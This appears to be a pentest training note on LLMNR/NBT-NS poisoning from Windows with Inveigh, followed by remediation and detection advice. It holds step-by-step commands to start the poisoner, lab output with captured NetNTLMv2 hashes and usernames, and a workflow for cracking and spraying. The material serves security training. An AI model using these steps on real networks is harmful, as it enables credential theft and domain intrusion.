# LLMNR/NBT-NS Poisoning from Windows

## Overview

LLMNR and NBT-NS poisoning can be performed from a **Windows host** as well as from Linux.

In the previous note, **Responder** was used from Linux to capture hashes.  
In this note, the focus is on **Inveigh**, which provides similar functionality from Windows.

This is useful when:

- your attack host is Windows-based
- the client gives you a Windows box to test from
- you land on a Windows host as local admin
- you want to continue credential capture without switching back to Linux

The end goal is the same:

- capture NTLM challenge-response material
- identify useful usernames
- crack hashes offline if worthwhile
- gain or expand a foothold in the domain

---

# Inveigh Overview

**Inveigh** is a Windows-oriented tool for:

- LLMNR poisoning
- NBT-NS poisoning
- credential capture
- rogue service emulation
- Man-in-the-Middle style attacks on local name resolution

It works similarly to Responder, but is written for Windows in:

- **PowerShell**
- **C#**

The tool is available in the provided lab at:

```powershell
C:\Tools
```

---

# Supported Protocols

Inveigh can listen on and/or spoof a wide range of protocols.

## Commonly supported

- LLMNR
- DNS
- mDNS
- NBNS
- DHCPv6
- ICMPv6
- HTTP
- HTTPS
- SMB
- LDAP
- WebDAV
- Proxy Auth

This makes it more than just a poisoner. It is also a rogue service and credential capture platform.

---

# PowerShell Version of Inveigh

## Importing the module

```powershell
Import-Module .\Inveigh.ps1
```

## Listing available parameters

```powershell
(Get-Command Invoke-Inveigh).Parameters
```

Example output:

```text
Key                     Value
---                     -----
ADIDNSHostsIgnore       System.Management.Automation.ParameterMetadata
KerberosHostHeader      System.Management.Automation.ParameterMetadata
ProxyIgnore             System.Management.Automation.ParameterMetadata
PcapTCP                 System.Management.Automation.ParameterMetadata
PcapUDP                 System.Management.Automation.ParameterMetadata
SpooferHostsReply       System.Management.Automation.ParameterMetadata
SpooferHostsIgnore      System.Management.Automation.ParameterMetadata
SpooferIPsReply         System.Management.Automation.ParameterMetadata
SpooferIPsIgnore        System.Management.Automation.ParameterMetadata
WPADDirectHosts         System.Management.Automation.ParameterMetadata
WPADAuthIgnore          System.Management.Automation.ParameterMetadata
ConsoleQueueLimit       System.Management.Automation.ParameterMetadata
ConsoleStatus           System.Management.Automation.ParameterMetadata
ADIDNSThreshold         System.Management.Automation.ParameterMetadata
ADIDNSTTL               System.Management.Automation.ParameterMetadata
DNSTTL                  System.Management.Automation.ParameterMetadata
HTTPPort                System.Management.Automation.ParameterMetadata
HTTPSPort               System.Management.Automation.ParameterMetadata
KerberosCount           System.Management.Automation.ParameterMetadata
LLMNRTTL                System.Management.Automation.ParameterMetadata
```

This shows that Inveigh is highly configurable and can be tuned for different environments and levels of stealth.

---

# Starting Inveigh (PowerShell Version)

The following example enables:

- LLMNR spoofing
- NBNS spoofing
- console output
- file output

```powershell
Invoke-Inveigh -LLMNR Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```

> Note: In the original snippet, the command appears as:
>
> ```powershell
> Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
> ```
>
> In practice, the intended parameter is enabling LLMNR explicitly, typically:
>
> ```powershell
> Invoke-Inveigh -LLMNR Y -NBNS Y -ConsoleOutput Y -FileOutput Y
> ```

---

## Example startup output

```text
[*] Inveigh 1.506 started at 2022-02-28T19:26:30
[+] Elevated Privilege Mode = Enabled
[+] Primary IP Address = 172.16.5.25
[+] Spoofer IP Address = 172.16.5.25
[+] ADIDNS Spoofer = Disabled
[+] DNS Spoofer = Enabled
[+] DNS TTL = 30 Seconds
[+] LLMNR Spoofer = Enabled
[+] LLMNR TTL = 30 Seconds
[+] mDNS Spoofer = Disabled
[+] NBNS Spoofer For Types 00,20 = Enabled
[+] NBNS TTL = 165 Seconds
[+] SMB Capture = Enabled
[+] HTTP Capture = Enabled
[+] HTTPS Certificate Issuer = Inveigh
[+] HTTPS Certificate CN = localhost
[+] HTTPS Capture = Enabled
[+] HTTP/HTTPS Authentication = NTLM
[+] WPAD Authentication = NTLM
[+] WPAD NTLM Authentication Ignore List = Firefox
[+] WPAD Response = Enabled
[+] Kerberos TGT Capture = Disabled
[+] Machine Account Capture = Disabled
[+] Console Output = Full
[+] File Output = Enabled
[+] Output Directory = C:\Tools
WARNING: [!] Run Stop-Inveigh to stop
[*] Press any key to stop console output
WARNING: [-] [2022-02-28T19:26:31] Error starting HTTP listener
WARNING: [!] [2022-02-28T19:26:31] Exception calling "Start" with "0" argument(s): "An attempt was made to access a socket in a way forbidden by its access permissions" $HTTP_listener.Start()
[+] [2022-02-28T19:26:31] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled]
[+] [2022-02-28T19:26:31] LLMNR request for academy-ea-web0 received from 172.16.5.125 [response sent]
[+] [2022-02-28T19:26:34] TCP(445) SYN packet detected from 172.16.5.125:56834
[+] [2022-02-28T19:26:34] SMB(445) negotiation request detected from 172.16.5.125:56834
[+] [2022-02-28T19:26:34] SMB(445) NTLM challenge 7E3B0E53ADB4AE51 sent to 172.16.5.125:56834
```

---

## What this tells us

From the startup output we can immediately learn:

- our IP address
- whether elevation is available
- which spoofers are enabled
- whether capture services are enabled
- where output files are written
- whether any listeners failed to start
- whether traffic is already being seen on the network

### Important observation

The HTTP listener failed to start because something else was already using the socket or Windows permissions blocked it:

```text
Error starting HTTP listener
An attempt was made to access a socket in a way forbidden by its access permissions
```

This is common on Windows if:

- another service is already bound to port 80
- the process lacks sufficient rights
- a firewall or other protection interferes

---

# What Inveigh Is Doing Here

From the runtime log we can see the attack flow in action:

1. A victim host sends an mDNS request
2. mDNS spoofing is disabled, so Inveigh ignores it
3. The same victim sends an LLMNR request
4. Inveigh responds
5. The victim attempts SMB negotiation
6. Inveigh sends an NTLM challenge
7. The victim proceeds with authentication
8. The resulting hash can be captured

This is the same core principle as Responder, just performed from Windows.

---

# C# Version: InveighZero

## Why use it?

The **PowerShell version** is the original version of Inveigh and is no longer actively maintained.

The **C# version**:

- is actively maintained
- combines PowerShell features and original PoC logic
- is generally the preferred modern version

The compiled executable is included in:

```powershell
C:\Tools
```

---

# Running the C# Version

```powershell
.\Inveigh.exe
```

## Example output

```text
[*] Inveigh 2.0.4 [Started 2022-02-28T20:03:28 | PID 6276]
[+] Packet Sniffer Addresses [IP 172.16.5.25 | IPv6 fe80::dcec:2831:712b:c9a3%8]
[+] Listener Addresses [IP 0.0.0.0 | IPv6 ::]
[+] Spoofer Reply Addresses [IP 172.16.5.25 | IPv6 fe80::dcec:2831:712b:c9a3%8]
[+] Spoofer Options [Repeat Enabled | Local Attacks Disabled]
[ ] DHCPv6
[+] DNS Packet Sniffer [Type A]
[ ] ICMPv6
[+] LLMNR Packet Sniffer [Type A]
[ ] MDNS
[ ] NBNS
[+] HTTP Listener [HTTPAuth NTLM | WPADAuth NTLM | Port 80]
[ ] HTTPS
[+] WebDAV [WebDAVAuth NTLM]
[ ] Proxy
[+] LDAP Listener [Port 389]
[+] SMB Packet Sniffer [Port 445]
[+] File Output [C:\Tools]
[+] Previous Session Files (Not Found)
[*] Press ESC to enter/exit interactive console
[!] Failed to start HTTP listener on port 80, check IP and port usage.
[!] Failed to start HTTPv6 listener on port 80, check IP and port usage.
[+] [20:03:31] LLMNR(A) request [academy-ea-web0] from 172.16.5.125 [response sent]
[-] [20:03:31] LLMNR(AAAA) request [academy-ea-web0] from 172.16.5.125 [type ignored]
[+] [20:03:31] LLMNR(A) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [response sent]
[-] [20:03:31] LLMNR(AAAA) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [type ignored]
```

---

## Reading the output

### `[+]` entries

Enabled and active features.

### `[ ]` entries

Disabled features.

### `[-]` entries

Requests seen but ignored, often because the type is not supported or not enabled.

For example:

```text
[-] LLMNR(AAAA) request ... [type ignored]
```

means IPv6 AAAA requests were seen, but not answered in that configuration.

---

# Interactive Console

One of the most useful features of the C# version is the **interactive console**.

Press:

```text
ESC
```

to enter or exit the console while Inveigh is running.

This lets you:

- inspect captured hashes
- view usernames
- review logs
- stop the tool
- work without scrolling through noisy live output

---

# Inveigh Console Help

Typing `HELP` in the interactive console shows available commands.

```text
=============================================== Inveigh Console Commands ===============================================

Command                           Description
========================================================================================================================
GET CONSOLE                     | get queued console output
GET DHCPv6Leases                | get DHCPv6 assigned IPv6 addresses
GET LOG                         | get log entries; add search string to filter results
GET NTLMV1                      | get captured NTLMv1 hashes; add search string to filter results
GET NTLMV2                      | get captured NTLMv2 hashes; add search string to filter results
GET NTLMV1UNIQUE                | get one captured NTLMv1 hash per user; add search string to filter results
GET NTLMV2UNIQUE                | get one captured NTLMv2 hash per user; add search string to filter results
GET NTLMV1USERNAMES             | get usernames and source IPs/hostnames for captured NTLMv1 hashes
GET NTLMV2USERNAMES             | get usernames and source IPs/hostnames for captured NTLMv2 hashes
GET CLEARTEXT                   | get captured cleartext credentials
GET CLEARTEXTUNIQUE             | get unique captured cleartext credentials
GET REPLYTODOMAINS              | get ReplyToDomains parameter startup values
GET REPLYTOHOSTS                | get ReplyToHosts parameter startup values
GET REPLYTOIPS                  | get ReplyToIPs parameter startup values
GET REPLYTOMACS                 | get ReplyToMACs parameter startup values
GET IGNOREDOMAINS               | get IgnoreDomains parameter startup values
GET IGNOREHOSTS                 | get IgnoreHosts parameter startup values
GET IGNOREIPS                   | get IgnoreIPs parameter startup values
GET IGNOREMACS                  | get IgnoreMACs parameter startup values
SET CONSOLE                     | set Console parameter value
HISTORY                         | get command history
RESUME                          | resume real time console output
STOP                            | stop Inveigh
```

---

# Viewing Captured NTLMv2 Hashes

A very useful command is:

```text
GET NTLMV2UNIQUE
```

This shows one unique NTLMv2 hash per user.

## Example output

```text
================================================= Unique NTLMv2 Hashes =================================================

Hashes
========================================================================================================================
backupagent::INLANEFREIGHT:B5013246091943D7:16A41B703C8D4F8F6AF75C47C3B50CB5:01010000000000001DBF1816222DD801DF80FE7D54E898EF0000000002001A0049004E004C0041004E004500460052004500490047004800540001001E00410043004100440045004D0059002D00450041002D004D005300300031000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0003004600410043004100440045004D0059002D00450041002D004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C00070008001DBF1816222DD8010600040002000000080030003000000000000000000000000030000004A1520CE1551E8776ADA0B3AC0176A96E0E200F3E0D608F0103EC5C3D5F22E80A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0035002E00320035000000000000000000
forend::INLANEFREIGHT:32FD89BD78804B04:DFEB0C724F3ECE90E42BAF061B78BFE2:010100000000000016010623222DD801B9083B0DCEE1D9520000000002001A0049004E004C0041004E004500460052004500490047004800540001001E00410043004100440045004D0059002D00450041002D004D005300300031000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0003004600410043004100440045004D0059002D00450041002D004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000700080016010623222DD8010600040002000000080030003000000000000000000000000030000004A1520CE1551E8776ADA0B3AC0176A96E0E200F3E0D608F0103EC5C3D5F22E80A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0035002E00320035000000000000000000
```

These are the captured **NetNTLMv2** challenge-response pairs.

---

# Viewing Captured Usernames

To quickly see which users have been captured, use:

```text
GET NTLMV2USERNAMES
```

## Example output

```text
=================================================== NTLMv2 Usernames ===================================================

IP Address                        Host                              Username                          Challenge
========================================================================================================================
172.16.5.125                    | ACADEMY-EA-FILE                 | INLANEFREIGHT\backupagent       | B5013246091943D7
172.16.5.125                    | ACADEMY-EA-FILE                 | INLANEFREIGHT\forend            | 32FD89BD78804B04
172.16.5.125                    | ACADEMY-EA-FILE                 | INLANEFREIGHT\clusteragent      | 28BF08D82FA998E4
172.16.5.125                    | ACADEMY-EA-FILE                 | INLANEFREIGHT\wley              | 277AC2ED022DB4F7
172.16.5.125                    | ACADEMY-EA-FILE                 | INLANEFREIGHT\svc_qualys        | 5F9BB670D23F23ED
```

---

## Why this is useful

This output helps you:

- see which accounts are actively authenticating
- identify potential service accounts
- decide which hashes are worth cracking
- build or enrich a user list for later spraying
- prioritize high-value accounts

For example, accounts like:

- `backupagent`
- `clusteragent`
- `svc_qualys`

may be particularly interesting because service accounts often have:

- elevated access
- password reuse
- poor password hygiene
- access to servers or admin tooling

---

# Workflow with Inveigh

A common workflow on Windows looks like this:

1. Start Inveigh
2. Let it run while doing other enumeration
3. Watch for LLMNR/NBNS activity
4. Enter the interactive console when needed
5. Retrieve captured usernames and hashes
6. Export or copy hashes
7. Crack them offline
8. Validate recovered credentials
9. Continue credentialed AD enumeration

---

# Comparing Inveigh and Responder

| Tool | Typical Platform | Notes |
|---|---|---|
| **Responder** | Linux | Very common, simple, purpose-built, highly effective |
| **Inveigh (PowerShell)** | Windows | Original Windows version, older |
| **InveighZero (C#)** | Windows | Modern, interactive, actively maintained |

If you are operating from Windows, **InveighZero** is typically the stronger choice.

---

# Remediation

MITRE ATT&CK tracks this as:

```text
T1557.001 - Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay
```

There are several ways to reduce or remove this attack path.

---

## 1. Disable LLMNR

LLMNR can be disabled via Group Policy:

```text
Computer Configuration
  → Administrative Templates
    → Network
      → DNS Client
        → Turn OFF Multicast Name Resolution
```

Enable that policy to disable LLMNR.

---

## 2. Disable NBT-NS

NBT-NS cannot be disabled directly through normal GPO policy settings in the same simple way. It usually must be disabled per adapter.

Manual GUI path:

1. Open **Network and Sharing Center**
2. Click **Change adapter settings**
3. Right-click adapter → **Properties**
4. Select **Internet Protocol Version 4 (TCP/IPv4)**
5. Click **Properties**
6. Click **Advanced**
7. Open **WINS** tab
8. Select **Disable NetBIOS over TCP/IP**

---

## 3. Disable NetBIOS via PowerShell Startup Script

A PowerShell script can be deployed via Group Policy Startup Scripts.

```powershell
$regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces"
Get-ChildItem $regkey | foreach {
    Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose
}
```

### Meaning of `NetbiosOptions`

- `0` = default
- `1` = enable NetBIOS
- `2` = disable NetBIOS over TCP/IP

---

## Deploying the Script by GPO

The script can be added under:

```text
Computer Configuration
  → Windows Settings
    → Scripts (Startup/Shutdown)
      → Startup
```

Important setting:

- Configure GPO to **Run Windows PowerShell scripts first**

The script can also be hosted centrally in SYSVOL, for example:

```text
\\inlanefreight.local\SYSVOL\INLANEFREIGHT.LOCAL\scripts
```

After the GPO is applied, the script will run at reboot and disable NetBIOS.

---

## 4. Enable SMB Signing

This does not stop poisoning itself, but it helps prevent **NTLM relay** attacks.

Poisoning + lack of SMB signing is often what makes relay especially dangerous.

---

## 5. Filter LLMNR / NBNS Traffic

Network controls can block or restrict:

- UDP 5355 (LLMNR)
- UDP 137 (NBT-NS)

This reduces exposure to poisoning attacks.

---

## 6. Network Segmentation

Segmenting the network reduces the number of hosts in the same broadcast domain and limits the reach of this attack.

This is especially useful if legacy systems still require LLMNR or NetBIOS.

---

## 7. IDS / IPS / Network Monitoring

Intrusion detection and prevention tools can help detect:

- unusual spoofing responses
- rogue SMB/HTTP listeners
- poisoning behavior on local segments

---

# Detection

If disabling LLMNR/NBT-NS is not practical, detection becomes very important.

---

## 1. Canary Name Requests

One strategy is to deliberately inject fake LLMNR/NBT-NS requests for non-existent hosts and alert when any system responds.

If a response appears, it strongly suggests:

- a rogue responder
- spoofing activity
- attacker presence on the subnet

This is effectively using the attack against the attacker.

---

## 2. Monitor UDP 5355 and UDP 137

Watch for unusual traffic involving:

- **UDP 5355** → LLMNR
- **UDP 137** → NetBIOS Name Service

Suspicious patterns include:

- many replies from a workstation
- one host answering for many names
- repeated poisoned responses

---

## 3. Monitor Service / Driver Events

Watch for:

- **Event ID 4697**
- **Event ID 7045**

These may indicate suspicious service installation or supporting malicious activity, depending on the attacker’s tooling and behavior.

---

## 4. Monitor Registry Changes for LLMNR

Track changes to:

```text
HKLM\Software\Policies\Microsoft\Windows NT\DNSClient
```

Specifically:

```text
EnableMulticast
```

A value of:

```text
0
```

means LLMNR is disabled.

This is more useful for configuration auditing and detecting changes than for detecting the live attack itself.

---

# Practical Notes

## HTTP listener failures are common

If Inveigh cannot bind to port 80, it may still capture useful traffic via:

- SMB
- LLMNR
- LDAP
- WebDAV

So a failed HTTP listener does **not** mean the attack is useless.

## Captured usernames matter even if hashes do not crack

Even when cracking fails, the user list alone can be valuable for:

- password spraying
- Kerberoasting targets
- BloodHound analysis
- privilege hunting
- service account identification

## Service accounts are high-value

Accounts such as:

- `backupagent`
- `clusteragent`
- `svc_qualys`

often deserve special attention because they may have:

- broad server access
- weak static passwords
- poor rotation practices
- privileges beyond normal users

---

# Quick Commands

## Import PowerShell Inveigh

```powershell
Import-Module .\Inveigh.ps1
```

## View available parameters

```powershell
(Get-Command Invoke-Inveigh).Parameters
```

## Start PowerShell Inveigh

```powershell
Invoke-Inveigh -LLMNR Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```

## Stop PowerShell Inveigh

```powershell
Stop-Inveigh
```

## Start C# Inveigh

```powershell
.\Inveigh.exe
```

## Enter / exit interactive console

```text
Press ESC
```

## Show console help

```text
HELP
```

## Show unique NTLMv2 hashes

```text
GET NTLMV2UNIQUE
```

## Show NTLMv2 usernames

```text
GET NTLMV2USERNAMES
```

## Show cleartext credentials if captured

```text
GET CLEARTEXT
```

## Stop Inveigh from interactive console

```text
STOP
```

---

# Key Takeaways

- LLMNR/NBT-NS poisoning can be performed from Windows just like from Linux
- **Inveigh** is the Windows counterpart to Responder
- The modern **C# version** is preferred over the legacy PowerShell version
- Inveigh can capture NTLM challenge-response material from local name resolution failures
- Its interactive console makes reviewing captured usernames and hashes much easier
- Disabling LLMNR/NBT-NS, enabling SMB signing, and segmenting the network are strong mitigations

---

# Next Step

Once hashes are captured, the next move is usually to:

- decide which accounts are worth cracking
- crack offline where it makes sense
- validate recovered credentials
- continue credentialed enumeration
- or pivot into **password spraying** if poisoning does not produce useful results

BloodHound is particularly useful at this stage to decide which users are worth prioritizing.

---

# Tags

#active-directory  
#llmnr  
#nbtns  
#inveigh  
#inveighzero  
#windows  
#credential-access  
#mitm  
#ntlmv2  
#hash-capture  
#internal-pentest  
#obsidian